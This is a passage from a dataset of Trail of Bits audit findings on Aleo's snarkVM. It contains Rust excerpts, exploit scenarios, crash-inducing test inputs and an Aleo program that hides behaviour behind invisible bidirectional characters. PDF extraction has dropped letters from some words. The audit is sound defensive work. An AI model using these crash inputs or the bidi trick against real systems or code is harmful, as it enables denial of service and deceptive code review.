::Output { Scalar::new( self .scalar / other.scalar) } } Figure 1.2: console/types/scalar/src/arithmetic.rs#L137-L146 Exploit Scenario An attacker sends a zero value which is used in a division, causing a runtime error and the program to halt. Recommendations Short term, add checks to validate that the divisor is non-zero on both the Field and Scalar divisions. Long term, add tests exercising all arithmetic operations with the zero element.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. from_xy_coordinates function lacks checks and can panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "Unlike Group::from_x_coordinate , the Group::from_xy_coordinates function does not enforce the resulting point to be on the elliptic curve or in the correct subgroup. Two dierent behaviors can occur depending on the underlying curve:  For a short Weierstrass curve (gure 2.1), the function will always succeed and not perform any membership checks on the point; this could lead to an invalid point being used in other curve operations, potentially leading to an invalid curve attack. /// Initializes a new affine group element from the given coordinates. fn from_coordinates (coordinates: Self ::Coordinates) -> Self { let (x, y, infinity) = coordinates; Self { x, y, infinity } } Figure 2.1: No curve membership checks present at curves/src/templates/short_weierstrass_jacobian/affine.rs#L103-L107  For a twisted Edwards curve (gure 2.2), the function will panic if the point is not on the curveunlike the from_x_coordinate function, which returns an Option . /// Initializes a new affine group element from the given coordinates. fn from_coordinates (coordinates: Self ::Coordinates) -> Self { let (x, y) = coordinates; let point = Self { x, y }; assert! (point.is_on_curve()); point } Figure 2.2: curves/src/templates/twisted_edwards_extended/affine.rs#L102-L108 Exploit Scenario An attacker is able to construct an invalid point for the short Weierstrass curve, potentially revealing secrets if this point is used in scalar multiplications with secret data. Recommendations Short term, make the output type similar to the from_x_coordinate function, returning an Option . Enforce curve membership on the short Weierstrass implementation and consider returning None instead of panicking when the point is not on the twisted Edwards curve.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Blake2Xs implementation fails to provide the requested number of bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The Blake2Xs implementation returns an empty byte array when the requested number of bytes is between u16::MAX-30 and u16::MAX . The Blake2Xs is an extendible-output hash function (XOF): It receives a parameter called xof_digest_length that determines how many bytes the hash function should return. When computing the necessary number of rounds, there is an integer overow if xof_digest_length is between u16::MAX-30 and u16::MAX . This integer overow causes the number of rounds to be zero and the resulting hash to have zero bytes. fn evaluate (input: & [ u8 ], xof_digest_length : u16 , persona: & [ u8 ]) -> Vec < u8 > { assert! (xof_digest_length > 0 , \"Output digest must be of non-zero length\" ); assert! (persona.len() <= 8 , \"Personalization may be at most 8 characters\" ); // Start by computing the digest of the input bytes. let xof_digest_length_node_offset = (xof_digest_length as u64 ) << 32 ; let input_digest = blake2s_simd::Params::new() .hash_length( 32 ) .node_offset(xof_digest_length_node_offset) .personal(persona) .hash(input); let mut output = vec! []; let num_rounds = ( xof_digest_length + 31 ) / 32 ; for node_offset in 0 ..num_rounds { Figure 3.1: console/algorithms/src/blake2xs/mod.rs#L32-L47 The nding is informational because the hash function is used only on the hash_to_curve routine, and never with an attacker-controlled digest length parameter. The currently used value is the size of the generator, which is not expected to reach values similar to u16::MAX . Exploit Scenario The Blake2Xs hash function is used with the maximum number of bytes, u16::MAX , to compare password hashes. Due to the vulnerability, any password will match the correct one since the hash output is always the empty array, allowing an attacker to gain access. Recommendations Short term, upcast the xof_digest_length variable to a larger type before the sum. This will prevent the overow while enforcing the u16::MAX bound on the requested digest length. 4. Blake2Xs implementations node o\u0000set denition di\u0000ers from specication Severity: Informational Diculty: High Type: Cryptography Finding ID: TOB-ALEOA-4 Target: console/algorithms/src/blake2xs/mod.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Compiling cast instructions can lead to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The output_types function of the cast instruction assumes that the number of record or interface elds equals the number of input types. // missing checks for (input_type, (_, entry_type)) in input_types.iter().skip( 2 ). zip_eq(record.entries() ) { Figure 5.1: Invocation of zip_eq on two iterators that dier in length ( cast.rs:401 ) Therefore, compiling a program with an unmatched cast instruction will cause a runtime panic. The program in gure 5.2 casts two registers into an interface type with only one eld: program aleotest.aleo; interface message: amount as u64; function test: input r0 as u64.private; cast r0 r0 into r1 as message; Figure 5.2: Program panics during compilation Figure 5.3 shows a program that will panic when compiling because it casts three registers into a record type with two elds: program aleotest.aleo; record token: owner as address.private; gates as u64.private; function test: input r0 as address.private; input r1 as u64.private; cast r0 r1 r1 into r2 as token.record; Figure 5.3: Program panics during compilation The following stack trace is printed in both cases: <itertools::zip_eq_impl::ZipEq<I,J> as core::iter::traits::iterator::Iterator>::next::h5c767bbe55881ac0 snarkvm_compiler::program::instruction::operation::cast::Cast<N>::output_types::h3d1 251fbb81d620f snarkvm_compiler::process::stack::helpers::insert::<impl snarkvm_compiler::process::stack::Stack<N>>::check_instruction::h6bf69c769d8e877b snarkvm_compiler::process::stack::Stack<N>::new::hb1c375f6e4331132 snarkvm_compiler::process::deploy::<impl snarkvm_compiler::process::Process<N>>::deploy::hd75a28b4fc14e19e snarkvm_fuzz::harness::fuzz_program::h131000d3e1900784 This bug was discovered through fuzzing with LibAFL . Figure 5.4: Stack trace Recommendations Short term, add a check to validate that the number of Cast arguments equals the number of record or interface elds. Long term, review all other uses of zip_eq and check the length of their iterators.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Displaying an Identier can cause a panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The Identifier of a program uses Fields internally. It is possible to construct an Identifier from an arbitrary bits array. However, the implementation of the Display trait of Identifier expects that this arbitrary data is valid UTF-8. Creating an identier from a bytes array already checks whether the bytes are valid UTF-8. The following formatting function tries to create a UTF-8 string regardless of the bits of the eld. fn fmt (& self , f: & mut Formatter) -> fmt :: Result { // Convert the identifier to bits. let bits_le = self . 0. to_bits_le(); // Convert the bits to bytes. let bytes = bits_le .chunks( 8 ) .map(|byte| u8 ::from_bits_le(byte).map_err(|_| fmt::Error)) .collect::< Result < Vec < u8 >, _>>()?; // Parse the bytes as a UTF-8 string. let string = String ::from_utf8(bytes).map_err(|_| fmt::Error)? ; ... } Figure 6.1: Relevant code ( parse.rs:76 ) As a result, constructing an Identifier with invalid UTF-8 bit array will cause a runtime error when the Identifier is displayed. The following test shows how to construct such an Identifier . #[test] fn test_invalid_identifier () { let invalid: & [ u8 ] = &[ 112 , 76 , 113 , 165 , 54 , 175 , 250 , 182 , 196 , 85 , 111 , 26 , 71 , 35 , 81 , 194 , 56 , 50 , 216 , 176 , 126 , 15 ]; let bits: Vec < bool > = invalid.iter().flat_map(|n| [n & ( 1 << 7 ) != 0 , n & ( 1 << 6 ) != 0 , n & ( 1 << 5 ) != 0 , n & ( 1 << 4 ) != 0 , n & ( 1 << 3 ) != 0 , n & ( 1 << 2 ) != 0 , n & ( 1 << 1 ) != 0 , n & ( 1 << 0 ) != 0 ]).collect(); let name = Identifier::from_bits_le(&bits).unwrap(); let network = Identifier::from_str( \"aleo\" ).unwrap(); let id = ProgramID::<CurrentNetwork>::from((name, network)); println!( \"{:?}\" , id.to_string()); } // a Display implementation returned an error unexpectedly: Error // thread 'program::tests::test_invalid_identifier' panicked at 'a Display implementation returned an error unexpectedly: Error', library/core/src/result.rs:1055:23 4: <T as alloc::string::ToString>::to_string at /rustc/dc80ca78b6ec2b6bba02560470347433bcd0bb3c/library/alloc/src/string.rs:2489:9 5: snarkvm_compiler::program::tests::test_invalid_identifier at ./src/program/mod.rs:650:26 Figure 6.2: Test causing a panic The testnet3_add_fuzz_tests branch has a workaround that prevents nding this issue. Using the arbitrary crate, it is likely that non-UTF-8 bit-strings end up in identiers. We suggest xing this bug instead of using the workaround. This bug was discovered through fuzzing with LibAFL. Recommendations Short term, we suggest using a placeholder like unprintable identifier instead of returning a formatting error. Alternatively, a check for UTF-8 could be added in the Identifier::from_bits_le .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Build script causes compilation to rerun ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "Using the current working directory as a rerun condition causes unnecessary recompilations, as any change in cargos target directory will trigger a compilation. // Re-run upon any changes to the workspace. println!( \"cargo:rerun-if-changed=.\" ); Figure 7.1: Rerun condition in build.rs ( build.rs:57 ) The root build script also implements a check that all les include the proper license. However, the check is insucient to catch all cases where developers forget to include a license. Adding a new empty Rust le without modifying any other le will not make the check in the build.rs fail because the check is not re-executed. Recommendations Short term, remove the rerun condition and use the default Cargo behavior . By default cargo reruns the build.rs script if any Rust le in the source tree has changed. Long term, consider using a git commit hook to check for missing licenses at the top of les. An example of such a commit hook can be found here .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Invisible codepoints are supported ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The current parser allows any Unicode character in strings or comments, which can include invisible bidirectional override characters . Using such characters can lead to dierences between the code reviewed in a pull request and the compiled code. Figure 8.1 shows such a program: since r2 and r3 contain the hash of the same string, r4 is true , and r5 equals r1 , the output token has the amount eld set to the second input. However, the compiled program always returns a token with a zero amount . // Program comparing aleo with aleo string program aleotest.aleo; record token: owner as address.private; gates as u64.private; amount as u64.private; function mint: input r0 as address.private; input r1 as u64.private; hash.psd2 \"aleo\" into r2; \" into r3; hash.psd2 \"aleo // Same string again is.eq r2 r3 into r4; // r4 is true because r2 == r3 ternary r4 r1 0u64 into r5; // r5 is r1 because r4 is true cast r0 0u64 r5 into r6 as token.record; output r6 as token.record; Figure 8.1: Aleo program that evaluates unexpectedly By default, VSCode shows the Unicode characters (gure 8.2). Google Docs and GitHub display the source code as in gure 8.1. Figure 8.2: The actual source This nding is inspired by CVE-2021-42574 . Recommendations Short term, reject the following code points: U+202A, U+202B, U+202C, U+202D, U+202E, U+2066, U+2067, U+2068, U+2069. This list might not be exhaustive. Therefore, consider disabling all non-ASCII characters in the Aleo language. In the future, consider introducing escape sequences so users can still use bidirectional code points if there is a legitimate use case.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Merkle tree constructor panics with large leaf array ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The Merkle tree constructor panics or returns a malformed Merkle tree when the provided leaves array has more than usize::MAX/2 elements. To build a Merkle tree, the constructor receives the necessary array of leaves. Being a binary tree, the nal total number of nodes is computed using the smallest power of two above the number of leaves given: pub fn new (leaf_hasher: & LH , path_hasher: & PH , leaves: & [LH::Leaf]) -> Result < Self > { // Ensure the Merkle tree depth is greater than 0. ensure!(DEPTH > 0 , \"Merkle tree depth must be greater than 0\" ); // Ensure the Merkle tree depth is less than or equal to 64. ensure!(DEPTH <= 64 u8 , \"Merkle tree depth must be less than or equal to 64\" ); // Compute the maximum number of leaves. let max_leaves = leaves.len().next_power_of_two() ; // Compute the number of nodes. let num_nodes = max_leaves - 1 ; Figure 9.1: console/algorithms/src/blake2xs/mod.rs#L32-L47 The next_power_of_two function will panic in debug mode, and return 0 in release mode if the number is larger than (1 << (N-1)) . For the usize type, on 64-bit machines, the function returns 0 for numbers above 2 63 . On 32-bit machines, the necessary number of leaves would be at least 1+2 31 . Exploit Scenario An attacker triggers a call to the Merkle tree constructor with 1+2 31 leaves, causing the 32-bit machine to abort due to a runtime error or to return a malformed Merkle tree. Recommendations Short term, use checked_next_power_of_two and check for success. Check all other uses of the next_power_of_two for similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Downcast possibly truncates value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "To validate the console's Ciphertext eld vector length against a u32 constant, the program downcasts the length from usize to u32 . This could cause a value truncation and a successful write when an error should occur. Then, the program downcasts the value to a u16 , not checking rst if this is safe without truncation. fn write_le <W: Write >(& self , mut writer: W ) -> IoResult <()> { // Ensure the number of field elements does not exceed the maximum allowed size. if self . 0. len() as u32 > N::MAX_DATA_SIZE_IN_FIELDS { return Err (error( \"Ciphertext is too large to encode in field elements.\" )); } // Write the number of ciphertext field elements. ( self . 0. len() as u16 ).write_le(& mut writer)?; // Write the ciphertext field elements. self . 0. write_le(& mut writer) } } Figure 10.1: console/program/src/data/ciphertext/bytes.rs#L36-L49 Figure 10.2 shows another instance where the value is downcasted to u16 without checking if this is safe: // Ensure the number of field elements does not exceed the maximum allowed size. match num_fields <= N::MAX_DATA_SIZE_IN_FIELDS as usize { // Return the number of field elements. true => Ok ( num_fields as u16 ), Figure 10.2: console/program/src/data/ciphertext/size_in_fields.rs#L21-L30 A similar downcast is present in the Plaintext size_in_fields function . Currently, this downcast causes no issue because the N::MAX_DATA_SIZE_IN_FIELDS constant is less than u16::MAX . However, if this constant were changed, truncating downcasts could occur. Recommendations Short term, upcast N::MAX_DATA_SIZE_IN_FIELDS in Ciphertext::write_le to usize instead of downcasting the vector length, and ensure that the downcasts to u16 are safe.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Plaintext::from_bits_* functions assume array has elements ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The from_bits_le function assumes that the provided array is not empty, immediately indexing the rst and second positions without a length check: /// Initializes a new plaintext from a list of little-endian bits *without* trailing zeros. fn from_bits_le (bits_le: & [ bool ]) -> Result < Self > { let mut counter = 0 ; let variant = [bits_le[counter], bits_le[counter + 1 ]]; counter += 2 ; Figure 11.1: circuit/program/src/data/plaintext/from_bits.rs#L22-L28 A similar pattern is present on the from_bits_be function on both the Circuit and Console implementations of Plaintext . Instead, the function should rst check if the array is empty before accessing elements, or documentation should be added so that the function caller enforces this. Recommendations Short term, check if the array is empty before accessing elements, or add documentation so that the function caller enforces this.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Arbitrarily deep recursion causes stack exhaustion ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The codebase has recursive functions that operate on arbitrarily deep structures. This causes a runtime error as the programs stack is exhausted with a very large number of recursive calls. The Plaintext parser allows an arbitrarily deep interface value such as {bar: {bar: {bar: {... bar: true}}} . Since the formatting function is recursive, a suciently deep interface will exhaust the stack on the fmt_internal recursion. We conrmed this nding with a 2880-level nested interface. Parsing the interface with Plaintext::from_str succeeds, but printing the result causes stack exhaustion: #[test] fn test_parse_interface3 () -> Result <()> { let plain = Plaintext::<CurrentNetwork>::from_str( /* too long to display */ )?; println! ( \"Found: {plain}\\n\" ); Ok (()) } // running 1 test // thread 'data::plaintext::parse::tests::test_deep_interface' has overflowed its stack // fatal runtime error: stack overflow // error: test failed, to rerun pass '-p snarkvm-console-program --lib' Figure 12.1: console/algorithms/src/blake2xs/mod.rs#L32-L47 The same issue is present on the record and record entry formatting routines. The Record::find function is also recursive, and a suciently large argument array could also lead to stack exhaustion. However, we did not conrm this with a test. Exploit Scenario An attacker provides a program with a 2880-level deep interface, which causes a runtime error if the result is printed. Recommendations Short term, add a maximum depth to the supported data structures. Alternatively, implement an iterative algorithm for creating the displayed structure.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Inconsistent pair parsing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The codebase has several implementations to parse pairs from strings of the form key: value depending on the expected type of value . However, these parsers also handle whitespaces around the colon dierently. As an example, gure 13.1 shows a parser that allows whitespaces before the colon, while gure 13.2 shows one that does not: fn parse_pair <N: Network >(string: &str ) -> ParserResult <(Identifier<N>, Plaintext<N>)> { // Parse the whitespace and comments from the string. let (string, _) = Sanitizer::parse(string)?; // Parse the identifier from the string. let (string, identifier) = Identifier::parse(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the \":\" from the string. let (string, _) = tag( \":\" )(string)?; // Parse the plaintext from the string. let (string, plaintext) = Plaintext::parse(string)?; Figure 13.1: console/program/src/data/plaintext/parse.rs#L23-L34 fn parse_pair <N: Network >(string: &str ) -> ParserResult <(Identifier<N>, Entry<N, Plaintext<N>>)> { // Parse the whitespace and comments from the string. let (string, _) = Sanitizer::parse(string)?; // Parse the identifier from the string. let (string, identifier) = Identifier::parse(string)?; // Parse the \":\" from the string. let (string, _) = tag( \":\" )(string)?; // Parse the entry from the string. let (string, entry) = Entry::parse(string)?; Figure 13.2: console/program/src/data/record/parse_plaintext.rs#L23-L33 We also found that whitespaces before the comma symbol are not allowed: let (string, owner) = alt(( map(pair( Address::parse, tag( \".public\" ) ), |(owner, _)| Owner::Public(owner)), map(pair( Address::parse, tag( \".private\" ) ), |(owner, _)| { Owner::Private(Plaintext::from(Literal::Address(owner))) }), ))(string)?; // Parse the \",\" from the string. let (string, _) = tag( \",\" )(string)?; Figure 13.3: console/program/src/data/record/parse_plaintext.rs#L52-L60 Recommendations Short term, handle whitespace around marker tags (such as colon, commas, and brackets) uniformly. Consider implementing a generic pair parser that receives the expected value type parser instead of reimplementing it for each type. 14. Signature veries with di\u0000erent messages Severity: Informational Diculty: Low Type: Cryptography Finding ID: TOB-ALEOA-14 Target: console/account/src/signature/verify.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Unchecked output length during ToFields conversion ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "When converting dierent types to vectors of Field elements, the codebase has checks to validate that the resulting Field vector has fewer than MAX_DATA_SIZE_IN_FIELDS elements. However, the StringType::to_fields function is missing this validation: impl <E: Environment > ToFields for StringType<E> { type Field = Field<E>; /// Casts a string into a list of base fields. fn to_fields (& self ) -> Vec < Self ::Field> { // Convert the string bytes into bits, then chunk them into lists of size // `E::BaseField::size_in_data_bits()` and recover the base field element for each chunk. // (For advanced users: Chunk into CAPACITY bits and create a linear combination per chunk.) self .to_bits_le().chunks(E::BaseField::size_in_data_bits()).map(Field::from_bits_le) .collect() } } Figure 15.1: circuit/types/string/src/helpers/to_fields.rs#L20-L30 We also remark that other conversion functions, such as from_bits and to_bits , do not constraint the input or output length. Recommendations Short term, add checks to validate the Field vector length for the StringType::to_fields function. Determine if other output functions (e.g., to_bits ) should also enforce length constraints.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Potential panic on ensure_console_and_circuit_registers_match ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The codebase implements the ensure_console_and_circuit_registers_match function, which validates that the values on the console and circuit registers match. The function uses zip_eq to iterate over the two register arrays, but does not check if these arrays have the same length, leading to a runtime error when they do not. pub fn ensure_console_and_circuit_registers_match (& self ) -> Result <()> { use circuit::Eject; for ((console_index, console_register), (circuit_index, circuit_register)) in self .console_registers.iter(). zip_eq (& self .circuit_registers) Figure 16.1: vm/compiler/src/process/registers/mod.rs This runtime error is currently not reachable since the ensure_console_and_circuit_registers_match function is called only in CallStack::Execute mode, and the number of stored registers match in this case: // Store the inputs. function.inputs().iter().map(|i| i.register()).zip_eq(request.inputs()).try_for_each(|(register, input)| { // If the circuit is in execute mode, then store the console input. if let CallStack::Execute(..) = registers.call_stack() { // Assign the console input to the register. registers.store( self , register, input.eject_value())?; } // Assign the circuit input to the register. registers.store_circuit( self , register, input.clone()) })?; Figure 16.2: vm/compiler/src/process/stack/execute.rs Recommendations Short term, add a check to validate that the number of circuit and console registers match on the ensure_console_and_circuit_registers_match function.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Reserved keyword list is missing owner ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The compiler veries that identiers are not part of a list of reserved keywords. However, the list of keywords is missing the owner keyword. This contrasts with the other record eld, gates , which is a reserved keyword. // Record \"record\" , \"gates\" , // Program Figure 17.1: vm/compiler/src/program/mod.rs Recommendations Short term, add owner to the list of reserved keywords.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Commit and hash instructions not matched against the opcode in check_instruction_opcode ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The check_instruction_opcode function validates that the opcode and instructions match for the Literal , Call , and Cast opcodes, but not for the Commit and Hash opcodes. Although there is partial code for this validation, it is commented out: Opcode::Commit(opcode) => { // Ensure the instruction belongs to the defined set. if ![ \"commit.bhp256\" , \"commit.bhp512\" , \"commit.bhp768\" , \"commit.bhp1024\" , \"commit.ped64\" , \"commit.ped128\" , ] .contains(&opcode) { bail!( \"Instruction '{instruction}' is not the opcode '{opcode}'.\" ); } // Ensure the instruction is the correct one. // match opcode { // \"commit.bhp256\" => ensure!( // matches!(instruction, Instruction::CommitBHP256(..)), // \"Instruction '{instruction}' is not the opcode '{opcode}'.\" // ), // } } Opcode::Hash(opcode) => { // Ensure the instruction belongs to the defined set. if ![ \"hash.bhp256\" , \"hash.bhp512\" , \"hash.bhp768\" , \"hash.bhp1024\" , \"hash.ped64\" , \"hash.ped128\" , \"hash.psd2\" , \"hash.psd4\" , \"hash.psd8\" , ] .contains(&opcode) { bail!( \"Instruction '{instruction}' is not the opcode '{opcode}'.\" ); } // Ensure the instruction is the correct one. // match opcode { // \"hash.bhp256\" => ensure!( // matches!(instruction, Instruction::HashBHP256(..)), // \"Instruction '{instruction}' is not the opcode '{opcode}'.\" // ), // } } Figure 18.1: vm/compiler/src/process/stack/helpers/insert.rs Recommendations Short term, add checks to validate that the opcode and instructions match for the Commit and Hash opcodes.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Incorrect validation of the number of operands ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The implementation of Literals::fmt and Literals::write_le do not correctly validate the number of operands in the operation. Instead of enforcing the exact number of arguments, the implementations only ensure that the number of operands is less than or equal to the expected number of operands: /// Writes the operation to a buffer. fn write_le <W: Write >(& self , mut writer: W ) -> IoResult <()> { // Ensure the number of operands is within the bounds. if NUM_OPERANDS > N::MAX_OPERANDS { return Err (error( format! ( \"The number of operands must be <= {}\" , N::MAX_OPERANDS))); } // Ensure the number of operands is correct. if self .operands.len() > NUM_OPERANDS { return Err (error( format! ( \"The number of operands must be {}\" , NUM_OPERANDS))); } Figure 19.1: vm/compiler/src/program/instruction/operation/literals.rs#L294-L303 Recommendations Short term, replace the if statement guard with self.operands.len() != NUM_OPERANDS in both the Literals::fmt and Literals::write_le functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Inconsistent and random compiler error message ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "When the compiler nds a type mismatch between arguments and expected parameters, it emits an error message containing a dierent integer each time the code is compiled. Figure 20.1 shows an Aleo program that, when compiled twice, shows two dierent error messages (shown in gure 20.2). The error message also states that u8 is invalid, but at the same time expecting u8 . program main.aleo; closure clo: input r0 as i8; input r1 as u8; pow r0 r1 into r2; output r2 as i8; function compute: input r0 as i8.private; input r1 as i8.public; call clo r0 r1 into r2; // r1 is i8 but the closure requires u8 output r2 as i8.private; Figure 20.1: Aleo program ~/Documents/aleo/foo (testnet3?) $ aleo build  Compiling 'main.aleo'...  Loaded universal setup (in 1537 ms)  'u8' is invalid : expected u8, found 124i8 ~/Documents/aleo/foo (testnet3?) $ aleo build  Compiling 'main.aleo'...  Loaded universal setup (in 1487 ms)  'u8' is invalid : expected u8, found -39i8 Figure 20.2: Two compilation results Figure 20.3 shows the check that validates that the types match and shows the error message containing the actual literal instead of literal.to_type() : Plaintext::Literal(literal, ..) => { // Ensure the literal type matches. match literal.to_type() == *literal_type { true => Ok (()), false => bail!( \"'{ plaintext_type }' is invalid: expected {literal_type}, found { literal }\" ), Figure 20.3: vm/compiler/src/process/stack/helpers/matches.rs#L204-L209 Recommendations Short term, clarify the error message by rephrasing it and presenting only the literal type instead of the full literal.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Instruction add_* methods incorrectly compare maximum number of allowed instructions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "During function and closure parsing, the compiler collects input, regular, and output instructions into three dierent IndexSet s in the add_input , add_instruction , and add_output functions. All of these functions check that the current number of elements in their respective IndexSet does not exceed the maximum allowed number. However, the check is done before inserting the element in the set, allowing inserting in a set that is already at full capacity and creating a set with one element more than the maximum. Figure 21.1 shows the comparison between the current and the maximum number of allowed elements and the subsequent insertion, which is allowed even though the set could already be at full capacity. All add_input , add_instruction , and add_output functions for both the Function and Closure types present similar behavior. Note that although the number of input and output instructions is checked in other locations (e.g., on the add_closure or get_closure functions), the number of regular instructions is not checked there, allowing a function or a closure with 1 + N::MAX_INSTRUCTIONS . fn add_output (& mut self , output: Output <N>) -> Result <()> { // Ensure there are input statements and instructions in memory. ensure!(! self .inputs.is_empty(), \"Cannot add outputs before inputs have been added\" ); ensure!(! self .instructions.is_empty(), \"Cannot add outputs before instructions have been added\" ); // Ensure the maximum number of outputs has not been exceeded. ensure!( self .outputs.len() <= N::MAX_OUTPUTS , \"Cannot add more than {} outputs\" , N::MAX_OUTPUTS); // Insert the output statement. self .outputs.insert(output); Ok (()) } Figure 21.1: vm/compiler/src/program/function/mod.rs#L142-L153 Figure 21.1 shows another issue present only in the add_output functions (for both Function and Closure types): When an output instruction is inserted into the set, no check validates if this particular element is already in the set, replacing the previous element with the same key if present. This causes two output statements to be interpreted as a single one: program main.aleo; closure clo: input r0 as i8; input r1 as u8; pow r0 r1 into r2; output r2 as i8; output r2 as i8; function compute: input r0 as i8.private; input r1 as u8.public; call clo r0 r1 into r2 ; output r2 as i8.private; Figure 21.2: Test program Recommendations Short term, we recommend the following actions:    Modify the checks to validate the maximum number of allowed instructions to prevent the o-by-one error. Validate if outputs are already present in the Function and Closure sets before inserting an output. Add checks to validate the maximum number of instructions in the get_closure , get_function , add_closure , and add_function functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Instances of unchecked zip_eq can cause runtime errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The zip_eq operator requires that both iterators being zipped have the same length, and panics if they do not. In addition to the cases presented in TOB-ALEOA-5 , we found one more instance where this should be checked: // Retrieve the interface and ensure it is defined in the program. let interface = stack.program().get_interface(&interface_name)?; // Initialize the interface members. let mut members = IndexMap::new(); for (member, (member_name, member_type)) in inputs.iter(). zip_eq (interface.members()) { Figure 22.1: compiler/src/program/instruction/operation/cast.rs#L92-L99 Additionally, we found uses of the zip operator that should be replaced by zip_eq , together with an associated check to validate the equal length of their iterators: /// Checks that the given operands matches the layout of the interface. The ordering of the operands matters. pub fn matches_interface (& self , stack: & Stack <N>, operands: & [Operand<N>], interface: & Interface <N>) -> Result <()> { // Ensure the operands is not empty. if operands.is_empty() { bail!( \"Casting to an interface requires at least one operand\" ) } // Ensure the operand types match the interface. for (operand, (_, member_type)) in operands.iter(). zip (interface.members()) { Figure 22.2: vm/compiler/src/process/register_types/matches.rs#L20-L27 for (operand, (_, entry_type)) in operands.iter().skip( 2 ). zip (record_type.entries()) { Figure 22.3: vm/compiler/src/process/register_types/matches.rs#L106-L107 Exploit Scenario An incorrectly typed program causes the compiler to panic due to a mismatch between the number of arguments in a cast and the number of elements in the casted type. Recommendations Short term, add checks to validate the equal length of the iterators being zipped and replace the uses of zip with zip_eq together with the associated length validations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "23. Hash functions lack domain separation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
